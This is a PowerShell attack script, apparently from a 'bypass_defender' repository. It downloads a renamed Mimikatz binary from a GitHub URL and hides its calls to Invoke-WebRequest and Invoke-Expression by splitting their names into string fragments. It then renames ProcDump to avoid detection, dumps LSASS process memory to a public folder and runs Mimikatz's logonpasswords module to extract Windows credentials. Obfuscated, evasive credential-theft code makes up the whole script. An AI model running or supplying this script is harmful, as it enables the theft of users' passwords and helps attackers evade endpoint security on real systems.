# Step 1: Define obfuscated string for downloading Mimikatz from your GitHub repository and renaming it immediately after download
$downloadYilmaz = "https://raw.githubusercontent.com/onurcangnc/bypass_defender/main/sifreliokuma64.exe"
$renamedYilmaz = "sifreliokuma64.exe"  # New name after download
$downloadPath = "./$renamedYilmaz"

# Step 2: Obfuscate the Invoke-WebRequest command
$indirici = "Invo"
$indirici2 = "ke-"
$onur1 = "Web"
$onur2 = "Request"
$ben = $indirici + $indirici2 + $onur1 + $onur2   # Results in "Invoke-WebRequest"

# Execute the download and rename Mimikatz in a single command
& $ben -Uri $downloadYilmaz -OutFile $downloadPath
Write-Output "Downloaded and saved as $renamedYilmaz"

# Step 3: Define an obfuscated string for invoking ProcDump (assuming you have permission)
$atilla = "Invo"
$mesut = "ke-Ex"
$doga = "pression"
$sifrelitaktak = $atilla + $mesut + $doga   # Results in "Invoke-Expression"

# Step 4: Concatenate PowerShell module command and define ProcDump file path
$procDump = "pro" + "cdump64"
$filePath = "./" + $procDump + ".exe"  # Full path to procdump64.exe

# Step 5: Rename ProcDump to avoid detection
$yeniYilmaz = "yilmazdegirmenci.exe"
Rename-Item -Path $filePath -NewName $yeniYilmaz  # Rename to a less suspicious name
$renamedFilePath = "./" + $yeniYilmaz

# Step 6: Define the dump path and get the LSASS process ID
$sizinti = "C:\Users\Public\lsass.dmp"
$processId = (Get-Process "lsass").Id
Write-Output ("Found LSASS process. PID: " + $processId)

# Step 7: Execute the renamed ProcDump to create the .dmp file
$burak = "Start-Process -FilePath `"$renamedFilePath`" -ArgumentList `"-ma $processId $sizinti`" -NoNewWindow -Wait"
& $sifrelitaktak $burak  # Executes the obfuscated command to dump LSASS

# Confirmation message
Write-Output "Process memory dump completed and saved to $sizinti"

# Step 8: Define obfuscated Mimikatz command to analyze the dump
$suleyman = "sifreli"
$onurcan = "okuma"
$ozge = "64.exe"
$sifreliokuma = $suleyman + $onurcan + $ozge  # Results in "sifreliokuma64.exe"
$sifreliokumaYol = "./$sifreliokuma"  # Path to renamed Mimikatz

# Define the main components of the Mimikatz command
$sifreliYol = "`"$sifreliokumaYol`""  # Path to Mimikatz (already obfuscated as $sifreliokumaYol)
$miniokuyucuKomut = "sekurlsa::minidump"
$sifrelerinKomutu = "sekurlsa::logonpasswords"

# Define the .dmp file path
$sistemyolPath = $sizinti  # Path to the LSASS dump file, assuming $sizinti is defined earlier

# Construct each part of the command
$SifreliMinidump = "`"$miniokuyucuKomut`" `$sistemyolPath"  # minidump command with file path
$Sifreicerikleri = "`"$sifrelerinKomutu`""  # logonpasswords command

# Combine them into the final command
$FullKomut = "$sifreliYol $SifreliMinidump; $Sifreicerikleri"

# Step 9: Use Invoke-Expression to run the obfuscated Mimikatz command
& $sifrelitaktak $FullKomut

# Output confirmation
Write-Output "Sifreliokuma execution completed on $sizinti"
